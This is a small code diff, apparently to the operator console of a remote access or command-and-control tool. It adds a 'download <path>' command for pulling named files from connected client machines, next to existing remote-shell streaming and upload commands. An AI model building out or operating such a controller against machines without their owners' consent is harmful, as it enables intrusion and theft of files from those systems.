@@ -7,6 +7,7 @@ from src.ui.help import show_main_help, show_client_help
 from src.utils.net_io import recv, send
 import json
 from src.modules.shell_module import stream_shell
+from src.modules.file_transfer import download
 
 
 
@@ -76,9 +77,8 @@ def client_loop(client_info):
                 stream_shell(client_info['socket'], client_info['hostname'])
                 continue
                 
-            elif cmd.strip() == "download":
-                send(client_info['socket'], cmd)
-                print(f"{cl.green}[+] Downloading..{cl.reset}")
+            elif cmd.startswith("download "):
+                download(client_info['socket'], cmd)
                     
             elif cmd.strip() == "upload":
                 send(client_info['socket'], cmd)
